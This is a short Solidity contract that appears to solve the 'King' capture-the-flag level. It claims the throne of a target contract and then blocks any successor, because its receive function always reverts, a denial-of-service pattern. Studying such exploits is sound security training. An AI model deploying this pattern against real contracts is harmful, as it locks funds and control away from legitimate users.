// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./interfaces/IKing.sol";

contract KingAttack {
    function attack(IKing target) external payable {
        require(msg.value >= target.prize(), "King: Value must be gt|eq prize");

        // solhint-disable-next-line avoid-low-level-calls
        (bool isSuccess, ) = address(target).call{ value: msg.value }("");

        require(isSuccess, "King: Call error");

        require(address(this) == target._king() && msg.value == target.prize(), "King: Attack failed");
    }

    receive() external payable {
        revert("King: Level passed");
    }
}
